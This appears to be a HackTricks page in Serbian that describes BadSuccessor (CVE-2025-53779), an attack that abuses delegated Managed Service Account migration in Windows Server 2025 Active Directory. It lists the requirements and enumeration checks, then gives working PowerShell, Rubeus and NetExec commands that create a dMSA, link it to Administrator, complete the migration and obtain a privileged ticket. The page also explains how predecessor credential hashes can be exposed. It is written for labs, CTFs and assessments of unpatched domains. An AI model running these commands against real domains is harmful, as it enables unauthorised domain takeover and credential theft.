# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

**BadSuccessor** zloupotrebljava tok migracije **delegated Managed Service Account** (**dMSA**) uveden u **Windows Server 2025**. dMSA može biti povezan sa legacy nalogom preko **`msDS-ManagedAccountPrecededByLink`** i premeštan kroz stanja migracije čuvana u **`msDS-DelegatedMSAState`**. Ako napadač može da kreira dMSA u writable OU i kontroliše te atribute, KDC može izdati tikete za dMSA kojim upravlja napadač sa **authorization context** povezanog naloga.

U praksi to znači da korisnik sa niskim privilegijama, koji ima samo delegated OU prava, može da kreira novi dMSA, usmeri ga na `Administrator`, dovrši stanje migracije, i zatim dobije TGT čiji PAC sadrži privilegovane grupe kao što su **Domain Admins**.

## dMSA detalji migracije koji su bitni

- dMSA je funkcija **Windows Server 2025**.
- `Start-ADServiceAccountMigration` postavlja migraciju u stanje **started**.
- `Complete-ADServiceAccountMigration` postavlja migraciju u stanje **completed**.
- `msDS-DelegatedMSAState = 1` znači da je migracija pokrenuta.
- `msDS-DelegatedMSAState = 2` znači da je migracija završena.
- Tokom legitimne migracije, dMSA je namenjen da transparentno zameni nadmašeni nalog, tako da KDC/LSA zadržavaju pristup koji je prethodni nalog već imao.

Microsoft Learn takođe napominje da je tokom migracije originalni nalog vezan za dMSA i da je namera da dMSA pristupa onome čemu je stari nalog mogao da pristupi. To je bezbednosna pretpostavka koju BadSuccessor zloupotrebljava.

## Zahtevi

1. Domen gde **dMSA exists**, što znači da je podrška za **Windows Server 2025** prisutna na AD strani.
2. Napadač može da **kreira** `msDS-DelegatedManagedServiceAccount` objekte u nekom OU, ili ima ekvivalentna široka prava za kreiranje child objekata tamo.
3. Napadač može da **piše** relevantne dMSA atribute ili u potpunosti kontroliše dMSA koji je upravo kreirao.
4. Napadač može da zahteva Kerberos tikete iz domain-joined konteksta ili iz tunela koji ima pristup LDAP/Kerberos.

### Praktične provere

Najčistiji operator signal je da se verifikuje nivo domena/foresta i potvrdi da okruženje već koristi novi Server 2025 stack:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Ako vidite vrednosti kao što su `Windows2025Domain` i `Windows2025Forest`, tretirajte **BadSuccessor / dMSA migration abuse** kao proveru visokog prioriteta.

Takođe možete enumerisati writable OU-ove delegirane za dMSA kreiranje pomoću javno dostupnih alata:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Tok zloupotrebe

1. Kreiraj dMSA u OU gde imaš delegirana create-child prava.
2. Postavi **`msDS-ManagedAccountPrecededByLink`** na DN privilegovanog targeta kao što je `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Postavi **`msDS-DelegatedMSAState`** na `2` da označiš da je migracija završena.
4. Zatraži TGT za novi dMSA i koristi vraćeni ticket za pristup privilegovanim servisima.

PowerShell primer:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Primeri zahteva za ticket / operativni alati:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Zašto je ovo više od privilege escalation

Tokom legitimne migracije, Windows takođe mora da omogući novom dMSA da obrađuje tikete koji su izdati za prethodni nalog pre cutover-a. Zbog toga dMSA-related ticket material može da uključuje **current** i **previous** ključeve u **`KERB-DMSA-KEY-PACKAGE`** flow.

Za fake migraciju pod kontrolom napadača, to ponašanje može da pretvori BadSuccessor u:

- **Privilege escalation** nasleđivanjem privilegovanih group SID-ova u PAC-u.
- **Credential material exposure** zato što rukovanje previous-key može da otkrije materijal ekvivalentan RC4/NT hash-u prethodnika u ranjivim workflow-ovima.

To čini tehniku korisnom i za direktno preuzimanje domena i za naknadne operacije kao što su pass-the-hash ili širi credential compromise.

## Napomene o patch statusu

Originalno BadSuccessor ponašanje **nije samo teorijsko 2025 preview pitanje**. Microsoft je dodelio **CVE-2025-53779** i objavio security update u **August 2025**. Zadržite ovaj napad dokumentovan za:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **validation of OU delegations and dMSA exposure during assessments**

Nemojte pretpostavljati da je Windows Server 2025 domen ranjiv samo zato što postoji dMSA; proverite patch level i testirajte pažljivo.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
